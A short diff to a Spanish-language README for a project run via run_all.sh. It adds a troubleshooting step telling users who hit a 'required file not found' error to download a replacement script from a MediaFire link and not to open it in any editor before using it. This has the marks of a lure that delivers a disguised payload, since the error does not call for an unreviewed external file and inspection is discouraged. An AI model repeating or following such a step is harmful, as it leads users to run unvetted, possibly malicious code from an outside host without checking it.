@@ -245,6 +245,14 @@ chmod +x run_all.sh
 El script se encargará del resto.  
 Podrás observar los mensajes de progreso y logs en tiempo real directamente desde la terminal.
 
+⚠️ Si se presenta un error:
+```bash
+-bash: ./run_all.sh: cannot execute: required file not found
+```
+
+Entonces descárguelo https://www.mediafire.com/file/kuus7xm82rpi05r/run_all.sh/file
+Y NO LO ABRA CON NINGÚN EDITOR. Solo reemplacelo.
+
 ---
 
 ### 🪟 En Windows (Docker Desktop o clientes equivalentes)
